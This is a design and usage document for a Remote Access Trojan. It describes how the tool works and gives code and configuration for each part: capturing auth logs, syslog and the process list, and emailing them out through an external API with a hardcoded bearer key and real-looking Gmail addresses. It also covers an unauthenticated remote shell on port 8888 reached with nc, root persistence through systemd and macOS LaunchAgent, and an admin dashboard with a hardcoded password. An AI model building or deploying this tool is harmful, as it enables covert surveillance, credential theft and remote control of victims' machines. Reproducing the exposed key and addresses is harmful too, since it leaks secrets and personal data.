# RAT Application - How It Works

## Overview
This document explains how the RAT (Remote Access Trojan) application works, from installation to operation.

## Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                        TARGET DEVICE                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────────┐  │
│  │   Log        │───▶│   Email      │───▶│   SendLib API    │  │
│  │   Capture    │    │   Sender     │    │   (External)     │  │
│  └──────────────┘    └──────────────┘    └──────────────────┘  │
│                                                                  │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────────┐  │
│  │   Remote     │◀──▶│   Socket     │◀──▶│   Admin          │  │
│  │   Shell      │    │   Server     │    │   Dashboard      │  │
│  └──────────────┘    └──────────────┘    └──────────────────┘  │
│                                                                  │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │                    SQLite Database                       │  │
│  │  - Recipients  - Logs  - System Info  - Configuration   │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
                    ┌──────────────────┐
                    │      Nginx       │
                    │  (Reverse Proxy) │
                    └──────────────────┘
                              │
                              ▼
                    ┌──────────────────┐
                    │   Public URL     │
                    │   (Internet)     │
                    └──────────────────┘
```

## Component Breakdown

### 1. Log Capture Module (`logger.py`)

**Purpose**: Continuously monitors and captures system logs and events.

**How it works**:
```
1. Runs on a timer (default: every 5 minutes)
2. Captures:
   - System hostname
   - OS information
   - IP address
   - Authentication logs (/var/log/auth.log)
   - System messages (/var/log/syslog)
   - Running processes (ps aux)
3. Formats logs with timestamps
4. Stores in SQLite database
5. Passes to email sender
```

**Code Flow**:
```python
def capture():
    logs = []
    logs.append(f"=== RAT Log Capture - {timestamp} ===")
    
    # Get system info
    hostname = subprocess.check_output(['hostname'])
    os_info = subprocess.check_output(['uname', '-a'])
    ip = subprocess.check_output(['hostname', '-I'])
    
    # Get log files
    auth_log = subprocess.check_output(['tail', '-n', '50', '/var/log/auth.log'])
    syslog = subprocess.check_output(['tail', '-n', '50', '/var/log/syslog'])
    
    # Get processes
    processes = subprocess.check_output(['ps', 'aux'])
    
    return "\n".join(logs)
```

### 2. Email Sender Module (`emailer.py`)

**Purpose**: Sends captured logs and credentials via SendLib API.

**How it works**:
```
1. Connects to SendLib API (sendlib.samueltuoyo.com)
2. Uses API key for authentication
3. Sends emails from: sedquizstar@gmail.com
4. Sends to all active recipients in database
5. Supports HTML formatting for better readability
```

**API Request Format**:
```json
{
  "from": "sedquizstar@gmail.com",
  "to": "ujiroduke1@gmail.com",
  "subject": "RAT Log Capture - System Update",
  "body": "<pre>[log data]</pre>",
  "html": true
}
```

**Authentication**:
```
Authorization: Bearer sl_4df4dc04_c9784a4c0773e336d5883c679b4ab6c7225344af70373b13feeb8842
```

### 3. Remote Access Module (`remote.py`)

**Purpose**: Provides remote shell access to the target device.

**How it works**:
```
1. Starts a TCP socket server on port 8888
2. Listens for incoming connections
3. Receives commands from remote client
4. Executes commands via subprocess
5. Sends output back to client
6. Handles multiple concurrent connections
```

**Connection Flow**:
```
Admin Device                          Target Device
     │                                    │
     │──── Connect to port 8888 ──────▶   │
     │                                    │
     │◀──── Connection Accepted ────────│
     │                                    │
     │──── Send: "ls -la" ─────────────▶ │
     │                                    │
     │◀──── Output: [directory listing]─│
     │                                    │
     │──── Send: "cat /etc/passwd" ────▶ │
     │                                    │
     │◀──── Output: [file contents] ────│
```

### 4. Admin Dashboard (`dashboard/app.py`)

**Purpose**: Web-based interface for managing the RAT.

**Features**:
```
1. Login System
   - Username: admin
   - Password: rat_admin_2024
   
2. Recipient Management
   - Add new email recipients
   - View active recipients
   - Enable/disable recipients
   
3. Log Viewing
   - View captured logs
   - Filter by date
   - Export logs
   
4. System Information
   - View target device info
   - Monitor system status
```

**Routes**:
```
GET  /              - Dashboard home (requires login)
GET  /login         - Login page
POST /login         - Login submission
GET  /recipients    - List all recipients
POST /add_recipient - Add new recipient
GET  /logs          - View captured logs
GET  /system_info   - View system information
```

### 5. Service Manager

**Purpose**: Ensures the RAT runs as a background service and survives reboots.

**Linux (systemd)**:
```ini
[Unit]
Description=RAT Agent Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/home/dukeetheprogrammer/rat
ExecStart=/usr/bin/python3 /home/dukeetheprogrammer/rat/rat_agent/agent.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

**macOS (LaunchAgent)**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.rat.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>/path/to/rat_agent/agent.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
```

### 6. Nginx Configuration

**Purpose**: Serves the dashboard and provides a public URL.

**Configuration**:
```nginx
server {
    listen 80;
    server_name _;
    
    location /rat {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

## Execution Flow

### Startup Sequence
```
1. System boots
2. Systemd/LaunchAgent starts RAT agent
3. Agent initializes:
   - Loads configuration
   - Initializes database
   - Starts log capture thread
   - Starts remote access server
4. Agent enters main loop
5. Logs captured every 5 minutes
6. Emails sent to all recipients
```

### Log Capture Cycle
```
1. Timer triggers (every 300 seconds)
2. LogCapture.capture() called
3. System info gathered
4. Log files read
5. Process list captured
6. Data formatted
7. Stored in database
8. EmailSender.send_logs() called
9. Email sent via SendLib API
10. Timer resets
```

### Email Sending Flow
```
1. EmailSender receives log data
2. Queries database for active recipients
3. For each recipient:
   - Creates API request
   - Sets authentication header
   - Sends POST to SendLib API
   - Handles response
   - Logs success/failure
```

### Remote Access Flow
```
1. Socket server listening on port 8888
2. Client connects
3. New thread created for client
4. Main loop:
   - Receive command from client
   - Execute command via subprocess
   - Capture stdout/stderr
   - Send output to client
5. Client disconnects
6. Thread terminates
```

## Database Schema

### recipients Table
```sql
CREATE TABLE recipients (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT UNIQUE NOT NULL,
    added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    active BOOLEAN DEFAULT 1
);
```

### logs Table
```sql
CREATE TABLE logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    log_data TEXT NOT NULL,
    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    sent BOOLEAN DEFAULT 0
);
```

### system_info Table
```sql
CREATE TABLE system_info (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hostname TEXT,
    os_info TEXT,
    ip_address TEXT,
    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

## Configuration

### Default Settings
```python
# Email Configuration
SENDLIB_API_KEY = "sl_4df4dc04_c9784a4c0773e336d5883c679b4ab6c7225344af70373b13feeb8842"
SENDLIB_URL = "https://sendlib.samueltuoyo.com"
SENDER_EMAIL = "sedquizstar@gmail.com"
DEFAULT_RECIPIENTS = ["ujiroduke1@gmail.com"]

# Dashboard Configuration
DASHBOARD_HOST = "0.0.0.0"
DASHBOARD_PORT = 5000
DASHBOARD_USERNAME = "admin"
DASHBOARD_PASSWORD = "rat_admin_2024"

# Log Capture Settings
LOG_CAPTURE_INTERVAL = 300  # 5 minutes

# Remote Access Settings
REMOTE_PORT = 8888
REMOTE_ENABLED = True
```

## Usage Examples

### Adding a New Recipient
```
1. Access dashboard: http://<ip>/rat
2. Login with admin credentials
3. Navigate to "Recipients"
4. Enter new email address
5. Click "Add Recipient"
6. All recipients receive updated URL
```

### Viewing Captured Logs
```
1. Access dashboard
2. Login
3. Navigate to "Logs"
4. View recent log captures
5. Click on log to view full content
```

### Remote Command Execution
```
1. Connect to target: nc <target-ip> 8888
2. Send commands:
   $ ls -la
   $ cat /etc/passwd
   $ whoami
3. Receive output in real-time
```

## Troubleshooting

### Service Not Starting
```bash
# Check service status
systemctl status rat.service

# View logs
journalctl -u rat.service -f

# Manual start
python3 rat_agent/agent.py
```

### Emails Not Sending
```bash
# Test SendLib API
curl -X POST https://sendlib.samueltuoyo.com/api/send \
  -H "Authorization: Bearer YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"from":"sedquizstar@gmail.com","to":"test@test.com","subject":"Test","body":"Test"}'
```

### Dashboard Not Accessible
```bash
# Check if Flask is running
ps aux | grep flask

# Check nginx status
systemctl status nginx

# Test dashboard directly
curl http://127.0.0.1:5000
```
